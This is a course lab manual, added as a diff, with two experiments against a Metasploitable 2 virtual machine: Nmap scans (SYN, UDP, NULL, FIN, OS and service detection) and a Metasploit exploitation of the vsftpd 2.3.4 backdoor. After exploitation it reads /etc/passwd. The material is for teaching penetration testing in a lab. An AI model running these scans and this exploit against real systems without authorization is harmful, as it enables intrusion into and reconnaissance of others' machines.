@@ -1,0 +1,106 @@
+Experiment 2a: Network Scanning using Nmap
+Aim:
+
+To perform network discovery, port scanning, service detection, and OS detection using Nmap.
+
+Procedure:
+Start Kali Linux and Metasploitable 2 virtual machines.
+Obtain the IP address of the target machine.
+Open terminal in Kali Linux.
+Basic Nmap Scanning:
+Perform a simple scan:
+nmap 192.168.62.129
+Perform a verbose scan:
+nmap -v 192.168.62.129
+Scan multiple hosts:
+nmap 192.168.62.129 192.168.62.130
+Scan entire subnet:
+nmap 192.168.62.0/24
+Exclude a host:
+nmap 192.168.62.0/24 --exclude 192.168.62.130
+Port Scanning:
+Scan open ports:
+nmap --open 192.168.62.129
+Scan specific port:
+nmap -p 80 192.168.62.129
+Scan top ports:
+nmap --top-ports 10 192.168.62.129
+OS Detection:
+Detect operating system:
+nmap -O 192.168.62.129
+Detect OS with verbose output:
+nmap -v -O 192.168.62.129
+Aggressive OS detection:
+nmap -O --osscan-guess 192.168.62.129
+Service Version Detection:
+Detect service versions:
+nmap -sV 192.168.62.129
+Detailed version detection:
+nmap -sV --version-trace 192.168.62.129
+Advanced Scanning Techniques:
+SYN scan:
+nmap -sS 192.168.62.129
+UDP scan:
+nmap -sU 192.168.62.129
+NULL scan:
+sudo nmap -sN 192.168.62.129
+FIN scan:
+sudo nmap -sF 192.168.62.129
+Aggressive scan:
+nmap -A 192.168.62.129
+Packet Analysis:
+Enable packet tracing:
+nmap --packet-trace 192.168.62.129
+Result:
+
+Successfully scanned the network and identified open ports, services, and OS details of the target system.
+
+Experiment 2b: Penetration Testing using Metasploit Framework
+Aim:
+
+To identify and exploit vulnerabilities in a target system using Metasploit Framework.
+
+Procedure:
+Start Kali Linux and Metasploitable 2 virtual machines.
+Obtain the IP address of the target machine.
+Open terminal in Kali Linux.
+Metasploit Setup:
+Update Metasploit (optional):
+msfupdate
+Start Metasploit console:
+msfconsole
+Searching and Selecting Exploit:
+Search for exploits:
+search vsftpd
+Select the exploit:
+use exploit/unix/ftp/vsftpd_234_backdoor
+View options:
+show options
+Configuring Exploit:
+Set target IP:
+set RHOST 192.168.62.129
+Executing Exploit:
+Run exploit:
+exploit
+Post Exploitation:
+List files:
+ls
+View system file:
+cat /etc/passwd
+Create file:
+touch sample.txt
+Copy file:
+cp sample.txt newfile.txt
+Database Commands:
+Check database status:
+db_status
+Disconnect database:
+db_disconnect
+Import and Export:
+Import scan results:
+db_import file.xml
+Export scan results:
+db_export -f xml output.xml
+Result:
+
+Successfully exploited the target system and accessed system files using Metasploit Framework.
